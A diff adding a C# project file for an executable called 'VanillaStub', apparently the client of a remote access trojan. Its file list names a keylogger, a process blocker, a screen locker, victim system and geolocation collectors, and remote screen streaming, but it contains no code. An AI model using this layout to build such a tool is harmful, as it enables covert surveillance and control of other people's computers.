@@ -1,0 +1,145 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{A593FCD2-C8AB-45F6-9AEB-8AB5E20AB402}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <RootNamespace>VanillaStub</RootNamespace>
+    <AssemblyName>VanillaStub</AssemblyName>
+    <TargetFrameworkVersion>v4.6.1</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <AutoGenerateBindingRedirects>true</AutoGenerateBindingRedirects>
+    <Deterministic>true</Deterministic>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="System" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Management" />
+    <Reference Include="System.Runtime.Serialization" />
+    <Reference Include="System.Speech" />
+    <Reference Include="System.Xml.Linq" />
+    <Reference Include="System.Data.DataSetExtensions" />
+    <Reference Include="Microsoft.CSharp" />
+    <Reference Include="System.Data" />
+    <Reference Include="System.Deployment" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Net.Http" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="ClientSettings.cs" />
+    <Compile Include="Forms\Chat.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\Chat.Designer.cs">
+      <DependentUpon>Chat.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\InitialForm.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\InitialForm.Designer.cs">
+      <DependentUpon>InitialForm.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\ScreenLock.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\ScreenLock.Designer.cs">
+      <DependentUpon>ScreenLock.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Helpers\Information\ComputerInfo.cs" />
+    <Compile Include="Helpers\Information\GeoInfo.cs" />
+    <Compile Include="Helpers\Networking\Networking.cs" />
+    <Compile Include="Helpers\Networking\Telepathy\Client.cs" />
+    <Compile Include="Helpers\Networking\Telepathy\Common.cs" />
+    <Compile Include="Helpers\Networking\Telepathy\EventType.cs" />
+    <Compile Include="Helpers\Networking\Telepathy\Logger.cs" />
+    <Compile Include="Helpers\Networking\Telepathy\Message.cs" />
+    <Compile Include="Helpers\Networking\Telepathy\NetworkStreamExtensions.cs" />
+    <Compile Include="Helpers\Networking\Telepathy\SafeQueue.cs" />
+    <Compile Include="Helpers\Networking\Telepathy\Server.cs" />
+    <Compile Include="Helpers\Networking\Telepathy\Utils.cs" />
+    <Compile Include="Helpers\Services\AntiProcess.cs" />
+    <Compile Include="Helpers\Services\Keylogger.cs" />
+    <Compile Include="Helpers\Services\StreamClasses.cs" />
+    <Compile Include="Helpers\Services\StreamLibrary\Enums.cs" />
+    <Compile Include="Helpers\Services\StreamLibrary\IUnsafeCodec.cs" />
+    <Compile Include="Helpers\Services\StreamLibrary\IVideoCodec.cs" />
+    <Compile Include="Helpers\Services\StreamLibrary\src\CRC32.cs" />
+    <Compile Include="Helpers\Services\StreamLibrary\src\ExtensionAttribute.cs" />
+    <Compile Include="Helpers\Services\StreamLibrary\src\Extensions.cs" />
+    <Compile Include="Helpers\Services\StreamLibrary\src\FastBitmap.cs" />
+    <Compile Include="Helpers\Services\StreamLibrary\src\JpgCompression.cs" />
+    <Compile Include="Helpers\Services\StreamLibrary\src\LzwCompression.cs" />
+    <Compile Include="Helpers\Services\StreamLibrary\src\MurmurHash2Unsafe.cs" />
+    <Compile Include="Helpers\Services\StreamLibrary\src\NativeMethods.cs" />
+    <Compile Include="Helpers\Services\StreamLibrary\src\PayloadWriter.cs" />
+    <Compile Include="Helpers\Services\StreamLibrary\src\PointerHelper.cs" />
+    <Compile Include="Helpers\Services\StreamLibrary\src\SafeQuickLZ.cs" />
+    <Compile Include="Helpers\Services\StreamLibrary\src\SimpleBitmap.cs" />
+    <Compile Include="Helpers\Services\StreamLibrary\UnsafeCodecs\UnsafeStreamCodec.cs" />
+    <Compile Include="Program.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="Forms\IScreenLocker.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <EmbeddedResource Include="Forms\Chat.resx">
+      <DependentUpon>Chat.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Forms\InitialForm.resx">
+      <DependentUpon>InitialForm.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Forms\ScreenLock.resx">
+      <DependentUpon>ScreenLock.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Properties\Resources.resx">
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>Resources.Designer.cs</LastGenOutput>
+      <SubType>Designer</SubType>
+    </EmbeddedResource>
+    <Compile Include="Properties\Resources.Designer.cs">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Resources.resx</DependentUpon>
+      <DesignTime>True</DesignTime>
+    </Compile>
+    <None Include="Properties\Settings.settings">
+      <Generator>SettingsSingleFileGenerator</Generator>
+      <LastGenOutput>Settings.Designer.cs</LastGenOutput>
+    </None>
+    <Compile Include="Properties\Settings.Designer.cs">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Settings.settings</DependentUpon>
+      <DesignTimeSharedInput>True</DesignTimeSharedInput>
+    </Compile>
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="App.config" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="alert-logo-png-2.png" />
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+</Project>
